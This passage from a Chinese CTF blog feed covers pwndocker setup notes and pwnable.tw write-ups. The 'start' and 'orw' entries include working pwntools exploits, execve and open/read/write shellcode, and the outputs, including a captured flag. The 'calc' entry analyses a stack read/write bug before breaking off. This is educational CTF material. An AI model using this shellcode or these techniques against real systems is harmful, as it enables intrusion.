docker</h1><p>一个集成pwn常用工具的docker，暂时用的是<a href="https://github.com/skysider/pwndocker" target="_blank" rel="noopener">pwndocker</a>,不过比较臃肿，之后再自己搭建一个</p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p><em>一般刚开机docker未打开，使用<code>service docker start</code>打开服务</em></p><ol><li><code>pull</code></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull skysider/pwndocker</span><br></pre></td></tr></table></figure><ol start="2"><li><code>docker images</code> 可以看到已经在仓库里了</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/pwn/docker# docker images</span><br><span class="line">REPOSITORY           TAG                 IMAGE ID            CREATED             SIZE</span><br><span class="line">skysider/pwndocker   latest              a24dde07a423        6 days ago          2.02GB</span><br></pre></td></tr></table></figure><p>各项含义：</p><pre><code>REPOSITORY：表示镜像的仓库源TAG：镜像的标签IMAGE ID：镜像IDCREATED：镜像创建时间SIZE：镜像大小</code></pre><ol start="3"><li><code>docker run -t -i skysider/pwndocker</code>直接进入bash</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">~/pwn/docker# docker run -t -i skysider/pwndocker</span><br><span class="line">root@b11ff1440061:/ctf/work#</span><br></pre></td></tr></table></figure><pre><code>*b11ff1440061 是container的id*</code></pre><ol start="4"><li>外部文件要往container里复制，使用</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker cp /path/file b11ff1440061: /path</span><br></pre></td></tr></table></figure><p>当然b11ff1440061 换成container的id</p><ol start="5"><li>因为别人的docker工具不一定适合自己，需要自己再安装什么的，但是一般安装完退出后就又没有了，当然不能每次都重装</li></ol><p>有两种办法：</p><ul><li>在container中安装完以后，exit</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker commit  b11ff1440061 pwndocker</span><br></pre></td></tr></table></figure><p>同时可以使用</p><p>-m 来指定提交的说明信息，跟我们使用的版本控制一样<br>-a 可以指定更新的用户信息<br>之后是用来创建镜像容器的id 最后指定目标镜像仓库名和tag信息</p><p>这样可以将修改完的另存为新的image</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">~# docker images</span><br><span class="line">REPOSITORY           TAG                 IMAGE ID            CREATED             SIZE</span><br><span class="line">pwndocker            latest              7c0fa09ee004        12 seconds ago      2.05GB</span><br><span class="line">skysider/pwndocker   latest              a24dde07a423        6 days ago          2.02GB</span><br></pre></td></tr></table></figure><ul><li>使用dockerfile重新build</li></ul><p>像这里可以举例，编辑dockerfile：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">FROM skysider/pwndocker</span><br><span class="line"></span><br><span class="line">RUN apt-get install vim</span><br></pre></td></tr></table></figure><p>From 指定镜像源<br>RUN 指令告诉docker 在镜像内执行命令，安装了什么。。<br>EXPOSE 可以指定开放端口</p><p>编辑完后<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build -t pwndocker .</span><br></pre></td></tr></table></figure></p><p>按理说这样子就可以了。。但是我这里会有个报错<code>The command &#39;/bin/sh -c apt-get install vim&#39; returned a non-zero code: 1</code>仍未解决</p>]]></content>
      
      <categories>
          
          <category> skills </category>
          
      </categories>
      
      
        <tags>
            
            <tag> skills </tag>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>pwnable.tw-wp</title>
      <link href="/2018/11/06/pwnable-tw-wp/"/>
      <url>/2018/11/06/pwnable-tw-wp/</url>
      <content type="html"><![CDATA[<p><em>好久没碰pwn了，找找感觉</em><br><em>pwnable.tw网站的题都进不去，审查元素竟然没见到button响应？？于是就在源码里找题的文件源码保存下来，苟且做题</em></p><h1 id="start"><a href="#start" class="headerlink" title="start"></a>start</h1><p>见到的最轻巧的一个题</p><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">func main()</span><br><span class="line">push    esp</span><br><span class="line">; 4:   result = 3;</span><br><span class="line">push    offset _exit</span><br><span class="line">xor     eax, eax</span><br><span class="line">; 5:   __asm</span><br><span class="line">xor     ebx, ebx</span><br><span class="line">xor     ecx, ecx</span><br><span class="line">xor     edx, edx</span><br><span class="line">push    &apos;:FTC&apos;</span><br><span class="line">push    &apos; eht&apos;</span><br><span class="line">push    &apos; tra&apos;</span><br><span class="line">push    &apos;ts s&apos;</span><br><span class="line">push    2774654Ch</span><br><span class="line">mov     ecx, esp        ; addr</span><br><span class="line">mov     dl, 14h         ; len</span><br><span class="line">mov     bl, 1           ; fd</span><br><span class="line">mov     al, 4</span><br><span class="line">int     80h             ; LINUX - sys_write</span><br><span class="line">xor     ebx, ebx</span><br><span class="line">mov     dl, 60</span><br><span class="line">mov     al, 3</span><br><span class="line">int     80h             ; LINUX -</span><br><span class="line">add     esp, 14h</span><br><span class="line">retn</span><br><span class="line"></span><br><span class="line">func exit()</span><br><span class="line">pop     esp</span><br><span class="line">xor     eax, eax</span><br><span class="line">inc     eax</span><br><span class="line">int     80h</span><br></pre></td></tr></table></figure><p>以上为所有的代码。。。 可以看出先使用系统调用write到屏幕，然后又调用read，调用完退出</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>大致推测应该要使用ret2shellcode,一共可以输入60长度的字符，20个就会溢出，所以想着将shellcode放在返回地址之后。<br>看了一下pwntools自带的shellcraft长度也有44。。。所以需要自己写或者在shellstorm上找一找符合要求的。<br>不知道栈地址，所以需要第一次将返回地址覆盖为之前的mov ecx,esp地址，write输出泄露输入的起始地址。</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#sh = process(&apos;./start&apos;)</span><br><span class="line">sh = remote(&apos;chall.pwnable.tw&apos;,10000)</span><br><span class="line"></span><br><span class="line">shellcode =&quot;\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80&quot; </span><br><span class="line">print len(shellcode)</span><br><span class="line"></span><br><span class="line">pay = &apos;a&apos;*20 + p32(0x8048087) </span><br><span class="line">sh.recv()</span><br><span class="line">sh.send(pay)</span><br><span class="line">leak_addr = u32(sh.recv(4))</span><br><span class="line">print hex(leak_addr)</span><br><span class="line"></span><br><span class="line">esp_addr = leak_addr + 0x14</span><br><span class="line">pay = &apos;a&apos;*20 + p32(esp_addr) + shellcode</span><br><span class="line">sh.send(pay) </span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] Opening connection to chall.pwnable.tw on port 10000: Done</span><br><span class="line">21</span><br><span class="line">0xff936bc0</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">\x00\x00\x005o\x93\xff\x00\x00\x00\x00Go\x93\xff</span><br><span class="line">$ whoami</span><br><span class="line">start</span><br><span class="line">$</span><br></pre></td></tr></table></figure><h1 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h1><p>贼鸡儿诡异的一道题，回头发现题目名字很有深意 orw –&gt; open read write</p><h2 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">main:</span><br><span class="line"></span><br><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  orw_seccomp();</span><br><span class="line">  printf(&quot;Give my your shellcode:&quot;);</span><br><span class="line">  read(0, &amp;shellcode, 0xC8u);</span><br><span class="line">  ((void (*)(void))shellcode)();</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">orw_seccomp():</span><br><span class="line">unsigned int orw_seccomp()</span><br><span class="line">&#123;</span><br><span class="line">  __int16 v1; // [esp+4h] [ebp-84h]</span><br><span class="line">  char *v2; // [esp+8h] [ebp-80h]</span><br><span class="line">  char v3; // [esp+Ch] [ebp-7Ch]</span><br><span class="line">  unsigned int v4; // [esp+6Ch] [ebp-1Ch]</span><br><span class="line"></span><br><span class="line">  v4 = __readgsdword(0x14u);</span><br><span class="line">  qmemcpy(&amp;v3, &amp;unk_8048640, 0x60u);</span><br><span class="line">  v1 = 12;</span><br><span class="line">  v2 = &amp;v3;</span><br><span class="line">  prctl(38, 1, 0, 0, 0);                        // 38 PR_SET_NO_NEW_PRIVS</span><br><span class="line">                                                //               将调用线程的no_new_privs位设置为值</span><br><span class="line">                                                //               ARG2。将no_new_privs设置为1，execve（2）承诺不会</span><br><span class="line">                                                //               授予执行任何无法完成的任务的权限</span><br><span class="line">                                                //               没有execve（2）调用（例如，渲染集合 - </span><br><span class="line">                                                //               user-ID和set-group-ID模式位，以及非文件功能</span><br><span class="line">                                                //               功能性的）。设置后，该位不能取消设置。那个设定</span><br><span class="line">                                                //               这个位是由fork（2）和</span><br><span class="line">                                                //               克隆（2），并保存在execve（2）。</span><br><span class="line">                                                // </span><br><span class="line">  prctl(22, 2, &amp;v1);                            // 22 PR_SET_SECCOMP  </span><br><span class="line">                                                //   seccomp是一种内核中的安全机制,正常情况下,程序可以使用所有的syscall,       这是不安全的,</span><br><span class="line">                                                // 比如劫持程序流后通过execve的syscall来getshell.通过seccomp我们可以在程序中禁用掉某些syscall,这样就算劫持了程序流也只能调用部分的syscall了.</span><br><span class="line">                                                // 大概是终结了系统调用的可能,也就很难getshell了。</span><br><span class="line">  return __readgsdword(0x14u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><p>题目直接让输入shellcode，之后执行，仿佛很简单，但是orw_seccomp()这个函数里有一些奇奇怪怪的东西<br>看到了prctl函数。。。查了一些资料，看第一个的时候还以为是fork爆破canary，第二个查完发现应该是有一些特殊的点切入。</p><p>这块可以参考<br><a href="https://github.com/torvalds/linux/blob/master/include/uapi/linux/prctl.h" target="_blank" rel="noopener">https://github.com/torvalds/linux/blob/master/include/uapi/linux/prctl.h</a><br><a href="http://man7.org/linux/man-pages/man2/prctl.2.html" target="_blank" rel="noopener">http://man7.org/linux/man-pages/man2/prctl.2.html</a></p><p>因为看不了题，不过在源码里能看到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">             &lt;!-- description --&gt;</span><br><span class="line">               </span><br><span class="line">              &lt;div class=&quot;description&quot; hidden&gt;&lt;p&gt;Read the flag from &lt;code&gt;/home/orw/flag&lt;/code&gt;.&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">&lt;p&gt;Only &lt;code&gt;open&lt;/code&gt; &lt;code&gt;read&lt;/code&gt; &lt;code&gt;write&lt;/code&gt; syscall are allowed to use.&lt;/p&gt;</span><br></pre></td></tr></table></figure><p>这个描述给了切入点hhhh，也就是需要这三个系统调用来得到flag嘛</p><figure class="image-box">                <img src="/2018/11/06/pwnable-tw-wp/sys_call.png" alt="" 系统调用""="" title="" class="">                <p>"系统调用"</p>            </figure><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><p>简直就是汇编实习现场了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#sh = process(&apos;./orw&apos;)</span><br><span class="line">sh = remote(&quot;chall.pwnable.tw&quot;,10001)</span><br><span class="line"></span><br><span class="line">shellcode=&apos;&apos;&apos;</span><br><span class="line">push &#123;&#125;;</span><br><span class="line">push &#123;&#125;;</span><br><span class="line">push &#123;&#125;;</span><br><span class="line">push &#123;&#125;;</span><br><span class="line">mov ebx,esp;</span><br><span class="line">xor ecx,ecx;</span><br><span class="line">xor edx,edx;</span><br><span class="line">xor eax,eax;</span><br><span class="line">mov al,0x5;</span><br><span class="line">int 0x80;                    //open</span><br><span class="line"></span><br><span class="line">mov ebx,eax;</span><br><span class="line">xor eax,eax;</span><br><span class="line">mov al,0x3;</span><br><span class="line">mov ecx,esp;</span><br><span class="line">mov dl,0x30;</span><br><span class="line">int 0x80;                    //read</span><br><span class="line"></span><br><span class="line">mov al,0x4;</span><br><span class="line">mov bl,1;</span><br><span class="line">mov dl,0x30;</span><br><span class="line">int 0x80;                     //write</span><br><span class="line">&apos;&apos;&apos;.format(hex(u32(&apos;ag&apos;+chr(0)+chr(0))),hex(u32(&apos;w/fl&apos;)),hex(u32(&apos;e/or&apos;)),hex(u32(&apos;/hom&apos;)))</span><br><span class="line"></span><br><span class="line">sh.sendline(asm(shellcode))</span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] Opening connection to chall.pwnable.tw on port 10001: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">Give my your shellcode:FLAG&#123;sh3llc0ding_w1th_op3n_r34d_writ3&#125;</span><br><span class="line">�u�\x0[*] Got EOF while reading in interactive</span><br><span class="line">$</span><br></pre></td></tr></table></figure><h1 id="calc"><a href="#calc" class="headerlink" title="calc"></a>calc</h1><p>前面还一对代码说题目干净，这个题就开始一堆代码了。。。</p><h2 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">unsigned int calc()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; // [esp+18h] [ebp-5A0h]</span><br><span class="line">  int v2[100]; // [esp+1Ch] [ebp-59Ch]</span><br><span class="line">  char s; // [esp+1ACh] [ebp-40Ch]</span><br><span class="line">  unsigned int v4; // [esp+5ACh] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v4 = __readgsdword(0x14u);</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    bzero(&amp;s, 0x400u);                          // 置字节字符串前n个字节为零且包括‘\0’。 </span><br><span class="line">    if ( !get_expr((int)&amp;s, 1024) )</span><br><span class="line">      break;</span><br><span class="line">    init_pool(&amp;v1);                            //初始化v1</span><br><span class="line">    if ( parse_expr((int)&amp;s, &amp;v1) )</span><br><span class="line">    &#123;</span><br><span class="line">      printf((const char *)&amp;_d, v2[v1 - 1]);</span><br><span class="line">      fflush(stdout);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return __readgsdword(0x14u) ^ v4;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">init_pool():</span><br><span class="line"></span><br><span class="line">_DWORD *__cdecl init_pool(_DWORD *a1)</span><br><span class="line">&#123;</span><br><span class="line">  _DWORD *result; // eax</span><br><span class="line">  signed int i; // [esp+Ch] [ebp-4h]</span><br><span class="line"></span><br><span class="line">  result = a1;</span><br><span class="line">  *a1 = 0;</span><br><span class="line">  for ( i = 0; i &lt;= 99; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = a1;</span><br><span class="line">    a1[i + 1] = 0;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>重点函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line">signed int __cdecl parse_expr(int a1, _DWORD *a2)</span><br><span class="line">&#123;</span><br><span class="line">  int v2; // ST2C_4</span><br><span class="line">  int v4; // eax</span><br><span class="line">  int v5; // [esp+20h] [ebp-88h]</span><br><span class="line">  int i; // [esp+24h] [ebp-84h]</span><br><span class="line">  int O; // [esp+28h] [ebp-80h]</span><br><span class="line">  char *s1; // [esp+30h] [ebp-78h]</span><br><span class="line">  int num_left; // [esp+34h] [ebp-74h]</span><br><span class="line">  char s[100]; // [esp+38h] [ebp-70h]</span><br><span class="line">  unsigned int v11; // [esp+9Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v11 = __readgsdword(0x14u);</span><br><span class="line">  v5 = a1;</span><br><span class="line">  O = 0;</span><br><span class="line">  bzero(s, 0x64u);</span><br><span class="line">  for ( i = 0; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( *(char *)(i + a1) - &apos;0&apos; &gt; (unsigned int)&apos;\t&apos; )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = i + a1 - v5;</span><br><span class="line">      s1 = (char *)malloc(v2 + 1);</span><br><span class="line">      memcpy(s1, v5, v2);</span><br><span class="line">      s1[v2] = 0;</span><br><span class="line">      if ( !strcmp(s1, &quot;0&quot;) )                   // 输入不能为0</span><br><span class="line">      &#123;</span><br><span class="line">        puts(&quot;prevent division by zero&quot;);</span><br><span class="line">        fflush(stdout);</span><br><span class="line">        return 0;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      num_left = atoi(s1);</span><br><span class="line">      if ( num_left &gt; 0 )</span><br><span class="line">      &#123;</span><br><span class="line">        v4 = (*a2)++;                      // v4为操作数数目</span><br><span class="line">        a2[v4 + 1] = num_left;             // 操作数放入a2[1],a2[2],....</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      if ( *(_BYTE *)(i + a1) &amp;&amp; *(char *)(i + 1 + a1) - &apos;0&apos; &gt; (unsigned int)&apos;\t&apos; )   // 若下一个操作数仍未操作符即报错</span><br><span class="line">      &#123;</span><br><span class="line">        puts(&quot;expression error!&quot;);</span><br><span class="line">        fflush(stdout);</span><br><span class="line">        return 0;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      v5 = i + 1 + a1;</span><br><span class="line">      if ( s[O] )                               // s[0]为操作数数目</span><br><span class="line">      &#123;</span><br><span class="line">        switch ( *(char *)(i + a1) )</span><br><span class="line">        &#123;</span><br><span class="line">          case &apos;%&apos;:</span><br><span class="line">          case &apos;*&apos;:</span><br><span class="line">          case &apos;/&apos;:</span><br><span class="line">            if ( s[O] != &apos;+&apos; &amp;&amp; s[O] != &apos;-&apos; )</span><br><span class="line">            &#123;</span><br><span class="line">              eval(a2, s[O]);</span><br><span class="line">              s[O] = *(_BYTE *)(i + a1);</span><br><span class="line">            &#125;</span><br><span class="line">            else</span><br><span class="line">            &#123;</span><br><span class="line">              s[++O] = *(_BYTE *)(i + a1);</span><br><span class="line">            &#125;</span><br><span class="line">            break;</span><br><span class="line">          case &apos;+&apos;:</span><br><span class="line">          case &apos;-&apos;:</span><br><span class="line">            eval(a2, s[O]);</span><br><span class="line">            s[O] = *(_BYTE *)(i + a1);</span><br><span class="line">            break;</span><br><span class="line">          default:</span><br><span class="line">            eval(a2, s[O--]);</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      else</span><br><span class="line">      &#123;</span><br><span class="line">        s[O] = *(_BYTE *)(i + a1);</span><br><span class="line">      &#125;</span><br><span class="line">      if ( !*(_BYTE *)(i + a1) )</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  while ( O &gt;= 0 )</span><br><span class="line">    eval(a2, s[O--]);</span><br><span class="line">  return 1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">func eval():</span><br><span class="line"></span><br><span class="line">_DWORD *__cdecl eval(_DWORD *a1, char a2)</span><br><span class="line">&#123;</span><br><span class="line">  _DWORD *result; // eax</span><br><span class="line"></span><br><span class="line">  if ( a2 == &apos;+&apos; )</span><br><span class="line">  &#123;</span><br><span class="line">    a1[*a1 - 1] += a1[*a1];</span><br><span class="line">  &#125;</span><br><span class="line">  else if ( a2 &gt; &apos;+&apos; )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( a2 == &apos;-&apos; )</span><br><span class="line">    &#123;</span><br><span class="line">      a1[*a1 - 1] -= a1[*a1];</span><br><span class="line">    &#125;</span><br><span class="line">    else if ( a2 == &apos;/&apos; )</span><br><span class="line">    &#123;</span><br><span class="line">      a1[*a1 - 1] /= a1[*a1];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  else if ( a2 == &apos;*&apos; )</span><br><span class="line">  &#123;</span><br><span class="line">    a1[*a1 - 1] *= a1[*a1];</span><br><span class="line">  &#125;</span><br><span class="line">  result = a1; </span><br><span class="line">  --*a1;</span><br><span class="line">  return result;                             // 每一次计算的结果储存在 a1[1]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h2><p>  看上去比较杂乱，看了好久也没找到漏洞。。。分析一波大佬们的思路。</p><p>  程序中将a1[0] 存放操作数数目， a1[1,2…]后面存放操作数<br>  用num来表示a1</p><p>  则eval函数的逻辑就是这样：双目运算符，num[0] = 2,所以计算 a+b 逻辑便是：<br>  num[num[0] - 1] = num [2 - 1 ]= num[num[0] - 1] + num[ num[0] ] = num[2-1] + num[2]</p><p>  看样子没什么问题，但是假如直接输入比如说 +100， num[0] = 1 ,num[1] = 100<br>  num[num[0] - 1] = num [1 -1 ] = num[0] = num[num[0] - 1] + num[num[0]] = 1 + 100 = 101</p><p>  可以看出来num[0]的值被改变了，而程序最后输出是输出num[num[0]-1]的值，在这里也就是输出num[101 -1] = num [100]<br>  也就可以泄露栈内存了！！</p><p>  第二步，假如输入 +100+12，计算逻辑便是：<br>  num[num[0] - 1] = num [100] = num[num[0] - 1] + num[num[0]] = num[100] + num[101] = num[350] + 12    //为什么12会在num[101]处</p><p>  总之，这样子便能对任意栈地址写了！！</p><p>  由于每次计算都会对calc的栈区清零（bzero函数），所以我们要写到其他地方栈区，比如说，main函数的返回地址。（直接写以绕过canary）</p><p>  因为输入输出什么的都是数字，所以系统调用最为明智。</p><h2 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h2><p>!!!发现了神器!!!很早之前听说过的ropchain，没有在意，没想到，太可怕了！！！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span 